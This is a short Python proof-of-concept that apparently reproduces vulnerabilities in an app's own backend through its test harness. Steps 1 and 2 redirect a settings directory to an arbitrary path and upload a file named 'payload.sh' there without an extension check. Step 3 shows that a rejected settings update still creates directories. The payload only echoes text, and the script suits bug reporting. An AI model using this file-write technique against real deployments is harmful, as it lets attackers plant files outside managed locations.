import sys, tempfile, os
from pathlib import Path
sys.path.insert(0,__import__("os").environ.get("REPO","."))
from backend.tests.support import build_services, asgi_request
from backend.presentation.app import create_app

with tempfile.TemporaryDirectory() as tmp:
    tmp=Path(tmp); victim = tmp/"somewhere"/"else"/"entirely"      # NOT under any managed dir
    svc = build_services(project_root=tmp/"proj", runs_dir=tmp/"runs")
    app = create_app(svc)
    # 1. point loras_dir anywhere (validation mkdirs it)
    st,_,b = asgi_request(app,"/api/v1/settings",method="POST",json_body={"loras_dir":str(victim)})
    print("POST /settings loras_dir ->", st, "| dir created:", victim.is_dir())
    # 2. upload an arbitrary file (no extension check) into it
    st,_,b = asgi_request(app,"/api/v1/assets/lora/files/payload.sh",method="PUT",
                          body_bytes=b"#!/bin/sh\necho owned\n", content_type="application/octet-stream")
    print("PUT  /assets/lora/files/payload.sh ->", st, b)
    print("file exists outside managed dirs:", (victim/"payload.sh").exists(), "->", victim/"payload.sh")

    # 3. rejected settings update still leaves side effects
    other = tmp/"created_even_though_rejected"
    st,_,b = asgi_request(app,"/api/v1/settings",method="POST",
                          json_body={"checkpoints_dir":str(other),"venv_python":"/nonexistent/python"})
    print("\nmixed update (bad venv_python) ->", st, "| checkpoints_dir created anyway:", other.is_dir())
